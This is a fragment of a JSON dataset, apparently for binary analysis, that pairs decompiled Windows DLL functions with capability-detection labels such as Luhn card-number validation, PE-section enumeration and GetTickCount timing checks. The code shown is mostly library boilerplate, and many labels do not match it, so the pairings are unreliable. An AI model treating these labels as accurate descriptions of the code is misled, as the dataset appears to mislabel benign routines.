        "decompiled_code": "\nvoid __fastcall fcn.10008640(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x20);\n    ppcVar2[1] = 0x6;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_str_wchar_t_.0;\n    ppcVar2[5] = NULL;\n    ppcVar2[6] = NULL;\n    ppcVar2[7] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 279
    },
    "100086c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100086c0(uint *param_1, uint *param_2, uint *param_3)\n\n{\n    if (param_1 != param_2) {\n        do {\n            if (param_3 != NULL) {\n                *param_3 = *param_1;\n                param_3[1] = param_1[1];\n            }\n            param_1 = param_1 + 2;\n            param_3 = param_3 + 2;\n        } while (param_1 != param_2);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "10008780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10008780(ulong *param_1, ulong *param_2, ulong *param_3)\n\n{\n    if (param_1 != param_2) {\n        do {\n            if (param_3 != NULL) {\n                *param_3 = *param_1;\n                *(param_3 + 1) = *(param_1 + 1);\n            }\n            param_1 = param_1 + 0xc;\n            param_3 = param_3 + 0xc;\n        } while (param_1 != param_2);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "10008c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.10008c80(int32_t param_1, char param_2)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    code **ppcVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002ab50;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    ppcVar2 = fcn.1000ac95(0x18);\n    var_4h = 0;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[1] = (var_8h != '\\0') + 10;\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_assert.0;\n    ppcVar2[5] = NULL;\n    ppcVar3 = fcn.1000ac95(0x14);\n    *ppcVar3 = vtable.std::_Node_base.0;\n    ppcVar3[1] = 0x1;\n    ppcVar3[2] = NULL;\n    ppcVar3[3] = NULL;\n    ppcVar3[4] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    ppcVar2[5] = ppcVar3;\n    ppcVar3[4] = ppcVar2;\n    *(param_1 + 4) = ppcVar3;\n    *in_FS_OFFSET = var_ch_2;\n    return ppcVar2;\n}\n",
        "token_count": 514
    },
    "10008f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10008f60(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_retaddr;\n    \n    uVar3 = param_3 - param_2 >> 1;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    if (uVar3 != 0) {\n        if (0x7fffffff < uVar3) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = fcn.10002ed0(uVar3);\n        *param_1 = iVar2;\n        param_1[1] = iVar2;\n        param_1[2] = *param_1 + uVar3 * 2;\n        iVar2 = *param_1;\n        fcn.1000bc90(iVar2, unaff_retaddr, param_2 - unaff_retaddr);\n        param_1[1] = (param_2 - unaff_retaddr) + iVar2;\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "10008fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t ** __thiscall\nfcn.10008fd0(uint32_t **param_1, uint param_2, uint32_t *param_3, uint32_t param_4, uint32_t *param_5, uint32_t param_6\n            , uint32_t *param_7, uint32_t *param_8)\n\n{\n    uint32_t uVar1;\n    \n    while ((param_3 != param_5 || (param_4 != param_6))) {\n        if ((*param_3 & 1 << (param_4 & 0x1f)) == 0) {\n            uVar1 = *param_7 & ~(1 << (param_8 & 0x1f));\n        }\n        else {\n            uVar1 = *param_7 | 1 << (param_8 & 0x1f);\n        }\n        *param_7 = uVar1;\n        if (param_8 < 0x1f) {\n            param_8 = param_8 + 1;\n        }\n        else {\n            param_8 = NULL;\n            param_7 = param_7 + 1;\n        }\n        if (param_4 < 0x1f) {\n            param_4 = param_4 + 1;\n        }\n        else {\n            param_3 = param_3 + 1;\n            param_4 = 0;\n        }\n    }\n    *param_1 = param_7;\n    param_1[1] = param_8;\n    return param_1;\n}\n",
        "token_count": 334
    },
    "100097d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100097d0(uint32_t *param_1, ushort *param_2, ushort *param_3)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    \n    if (param_2 != param_3) {\n        do {\n            uVar2 = param_1[1];\n            uVar1 = *param_2;\n            if (*param_1 < uVar2 || *param_1 == uVar2) {\n                uVar4 = fcn.1000fe67(param_1[2], (uVar2 + 0x10) * 2);\n                if (uVar4 == 0) {\n                    fcn.1000b73a();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                param_1[2] = uVar4;\n                *param_1 = uVar2 + 0x10;\n            }\n            param_2 = param_2 + 1;\n            *(param_1[2] + param_1[1] * 2) = uVar1;\n            param_1[1] = param_1[1] + 1;\n        } while (param_2 != param_3);\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "10009830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.10009830(uint16_t *param_1, uint16_t *param_2, int32_t param_3, int32_t *param_4)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    uint32_t arg_8h;\n    \n    if (param_1 != param_2) {\n        param_3 = param_3 - param_1;\n        do {\n            arg_8h = *(param_3 + param_1);\n            pcVar1 = **(*param_4 + 4);\n            if (pcVar1 == vtable.std::ctype_wchar_t_.0) {\n                iVar2 = fcn.1000a294(*param_1, *(*param_4 + 4) + 2);\n            }\n            else {\n                iVar2 = (**(pcVar1 + 0x20))(*param_1);\n            }\n            pcVar1 = **(*param_4 + 4);\n            if (pcVar1 == vtable.std::ctype_wchar_t_.0) {\n                iVar3 = fcn.1000a294(arg_8h, *(*param_4 + 4) + 2);\n            }\n            else {\n                iVar3 = (**(pcVar1 + 0x20))(arg_8h);\n            }\n            if (iVar2 != iVar3) {\n                return 0;\n            }\n            param_1 = param_1 + 1;\n        } while (param_1 != param_2);\n    }\n    return 1;\n}\n",
        "token_count": 341
    },
    "100098d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100098d0(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_retaddr;\n    \n    param_3 = param_3 - param_2;\n    uVar3 = param_3 >> 1;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    if (uVar3 != 0) {\n        if (0x7fffffff < uVar3) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = fcn.10002ed0(uVar3);\n        *param_1 = iVar2;\n        param_1[1] = iVar2;\n        param_1[2] = *param_1 + uVar3 * 2;\n        iVar2 = *param_1;\n        fcn.1000bc90(iVar2, unaff_retaddr, param_3);\n        param_1[1] = param_3 + iVar2;\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "1000b974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x1000b984)\n// WARNING: Removing unreachable block (ram,0x1000b985)\n// WARNING: Removing unreachable block (ram,0x1000b98b)\n// WARNING: Removing unreachable block (ram,0x1000b994)\n// WARNING: Removing unreachable block (ram,0x1000b99b)\n\nvoid fcn.1000b974(void)\n\n{\n    return;\n}\n",
        "token_count": 98
    },
    "100100d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.100100d4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.1001ae2d();\n    iVar1 = fcn.10010113(in_ECX + 8, arg_8h * 2);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 163
    },
    "100113f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.100113f1(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x10041480);\n    return;\n}\n",
        "token_count": 49
    },
    "10011439": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10011439(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x10041480);\n    return;\n}\n",
        "token_count": 49
    },
    "10014733": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.10014733(void)\n\n{\n    fcn.10014918(0, \"AreFileApisANSI\", 0x1002f688, \"AreFileApisANSI\");\n    return;\n}\n",
        "token_count": 47
    },
    "1001474d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1001474d(void)\n\n{\n    fcn.10014918(1, \"CompareStringEx\", 0x1002f69c, \"CompareStringEx\");\n    return;\n}\n",
        "token_count": 45
    },
    "10014767": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.10014767(void)\n\n{\n    fcn.10014918(2, \"EnumSystemLocalesEx\", 0x1002f6b4, \"EnumSystemLocalesEx\");\n    return;\n}\n",
        "token_count": 49
    },
    "10014781": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.10014781(void)\n\n{\n    fcn.10014918(8, \"GetDateFormatEx\", 0x1002f71c, \"GetDateFormatEx\");\n    return;\n}\n",
        "token_count": 44
    },
    "1001479b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1001479b(void)\n\n{\n    fcn.10014918(0xb, \"GetLocaleInfoEx\", 0x1002f734, \"GetLocaleInfoEx\");\n    return;\n}\n",
        "token_count": 47
    },
    "100147b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.100147b5(void)\n\n{\n    fcn.10014918(0xe, \"GetTimeFormatEx\", 0x1002f74c, \"GetTimeFormatEx\");\n    return;\n}\n",
        "token_count": 48
    },
    "100147cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.100147cf(void)\n\n{\n    fcn.10014918(0xf, \"GetUserDefaultLocaleName\", 0x1002f764, \"GetUserDefaultLocaleName\");\n    return;\n}\n",
        "token_count": 48
    },
    "100147e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.100147e9(void)\n\n{\n    fcn.10014918(0x13, \"IsValidLocaleName\", 0x1002f7ac, \"IsValidLocaleName\");\n    return;\n}\n",
        "token_count": 47
    },
    "10014803": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.10014803(void)\n\n{\n    fcn.10014918(0x15, \"LCIDToLocaleName\", 0x1002f7e0, \"LCIDToLocaleName\");\n    return;\n}\n",
        "token_count": 51
    },
    "1001481d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1001481d(void)\n\n{\n    fcn.10014918(0x14, \"LCMapStringEx\", 0x1002f7c8, \"LCMapStringEx\");\n    return;\n}\n",
        "token_count": 50
    },
    "10014837": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.10014837(void)\n\n{\n    fcn.10014918(0x16, \"LocaleNameToLCID\", 0x1002f7fc, \"LocaleNameToLCID\");\n    return;\n}\n",
        "token_count": 50
    },
    "10019246": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10019246(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 41
    },
    "1001925a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.1001925a(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "1001a227": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.1001a227(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.1001ea1e();\n    return in_ST0;\n}\n",
        "token_count": 90
    },
    "1001a210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.1001a210(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    fcn.1001ea1e();\n    return in_ST0;\n}\n",
        "token_count": 114
    },
    "1001a867": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.1001a867(int16_t *arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == NULL) {\n        fcn.1001ae2d();\n        *(arg_ch + 8) = 0;\n        *(arg_ch + 0xc) = 0;\n    }\n    else {\n        if (*arg_8h != 0) {\n            arg_8h_00 = fcn.1001a58f(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n            if (arg_8h_00 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.10010e73(uVar2);\n                piVar3 = fcn.10010ea9();\n                return *piVar3;\n            }\n            if ((*(arg_ch + 0xc) <= arg_8h_00 && arg_8h_00 != *(arg_ch + 0xc)) &&\n               (iVar1 = fcn.1001ae47(arg_8h_00),  iVar1 != 0)) {\n                return iVar1;\n            }\n            iVar1 = fcn.1001a58f(arg_14h, 0, arg_8h, 0xffffffff, *(arg_ch + 8), *(arg_ch + 0xc), 0, 0);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.10010e73(uVar2);\n                piVar3 = fcn.10010ea9();\n                return *piVar3;\n            }\n            *(arg_ch + 0x10) = iVar1 + -1;\n            return 0;\n        }\n        if ((*(arg_ch + 0xc) == 0) && (iVar1 = fcn.1001ae47(1),  iVar1 != 0)) {\n            return iVar1;\n        }\n        **(arg_ch + 8) = 0;\n    }\n    *(arg_ch + 0x10) = 0;\n    return 0;\n}\n",
        "token_count": 530
    },
    "1001ae47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.1001ae47(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.1001ae2d();\n    iVar1 = fcn.10010113(in_ECX + 8, arg_8h);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 158
    },
    "10020320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.10020320(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 305
    },
    "100213a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint16_t __fastcall fcn.100213a0(uint32_t param_1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iStack4;\n    \n    uVar2 = 0x180c;\n    uVar3 = *0x10040986 + 0x184a;\n    if ((*0x100409b4 & 0xffff) <= param_1) {\n        *0x100409a4 = *0x10040986;\n        uVar2 = (param_1 * -3 + -0x2da7) - *0x10040986;\n    }\n    piVar1 = 0x100409ec;\n    do {\n        if (uVar3 == *0x100409a4) break;\n        *piVar1 = *piVar1 - param_1;\n        piVar1 = piVar1 + -1;\n        uVar2 = uVar3 * -0x56 + 0x2b;\n    } while (0x10040992 < piVar1);\n    *0x10040986 = *0x10040986 + (('+' - uVar3) - uVar2);\n    if ((*0x100409b4 & 0xffff) <= param_1) {\n        *0x100409a4 = *0x10040986;\n        uVar2 = ((uVar2 * 2 + param_1 * -3) - *0x10040986) - 23999;\n    }\n    uVar3 = ((iStack4 + uVar3 * -0x55 & 0xffff) - iStack4) - 5;\n    *0x10042628 = 0;\n    while (uVar3 != *0x100409a4) {\n        uVar2 = uVar2 + *(*0x10042628 * 2 + 0x10040990);\n        uVar3 = param_1 + 0x3e + uVar2;\n        if ((uVar2 == *0x1004099a) || (*0x10042628 = *0x10042628 + 2,  0x1c < *0x10042628)) break;\n    }\n    *0x100409b4 = (*0x10040986 - uVar2) + -5;\n    *0x10040984 = iStack4 + *0x100409b4 * -0x55;\n    *0x10040986 = *0x100409b4 + '\\x01' + uVar2;\n    return *0x10040984;\n}\n",
        "token_count": 580
    },
    "1000d47b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.1000d47b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.1000ce14(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "10009bae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10009bae(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        if (iVar1 < 8) {\n            fcn.1000a60d(iVar1 * 0x18 + 0x10040de8);\n        }\n        return;\n    }\n    fcn.10011439(4);\n    return;\n}\n",
        "token_count": 104
    },
    "100040b0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.100040b0(char16_t *arg_8h, uint noname_1, char16_t *arg_10h)\n\n{\n    char16_t *pcVar1;\n    uint32_t uVar2;\n    char16_t **in_ECX;\n    uint extraout_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a993;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    in_ECX[2] = arg_10h;\n    *in_ECX = L\"simi\";\n    in_ECX[1] = L\"simi\";\n    in_ECX[3] = NULL;\n    in_ECX[4] = NULL;\n    arg_10h = NULL;\n    in_ECX[5] = NULL;\n    in_ECX[6] = NULL;\n    in_ECX[7] = NULL;\n    fcn.10003b50(0, &arg_10h, uVar2);\n    in_ECX[8] = NULL;\n    pcVar1 = in_ECX[5];\n    if (in_ECX[6] - pcVar1 >> 2 != 0) {\n        in_ECX[6] = pcVar1;\n    }\n    in_ECX[8] = NULL;\n    var_4h = 1;\n    fcn.10005770(arg_8h, extraout_ECX);\n    in_ECX[0xf] = arg_8h;\n    in_ECX[0x10] = 0x1;\n    in_ECX[0x14] = 0x8775dfb;\n    fcn.100054a0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 443
    },
    "10002660": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.10002660(uint32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (param_2 < 0x15555556) {\n        uVar2 = param_1;\n        if (param_2 * 0xc < 0x1000) {\ncode_r0x10002696:\n            fcn.1000acc8(uVar2);\n            return;\n        }\n        if ((param_1 & 0x1f) != 0) goto code_r0x100026a5;\n        uVar2 = *(param_1 - 4);\n        if (param_1 <= uVar2) goto code_r0x100026aa;\n        if (3 < param_1 - uVar2) {\n            if (param_1 - uVar2 < 0x24) goto code_r0x10002696;\n            goto code_r0x100026b4;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x100026a5:\n        fcn.10010ddf();\ncode_r0x100026aa:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x100026b4:\n    fcn.10010ddf();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 311
    },
    "100038c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.100038c0(uint32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (param_2 < 0x20000000) {\n        uVar2 = param_1;\n        if (param_2 << 3 < 0x1000) {\ncode_r0x100038f3:\n            fcn.1000acc8(uVar2);\n            return;\n        }\n        if ((param_1 & 0x1f) != 0) goto code_r0x10003902;\n        uVar2 = *(param_1 - 4);\n        if (param_1 <= uVar2) goto code_r0x10003907;\n        if (3 < param_1 - uVar2) {\n            if (param_1 - uVar2 < 0x24) goto code_r0x100038f3;\n            goto code_r0x10003911;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x10003902:\n        fcn.10010ddf();\ncode_r0x10003907:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10003911:\n    fcn.10010ddf();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 309
    },
    "10003af0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
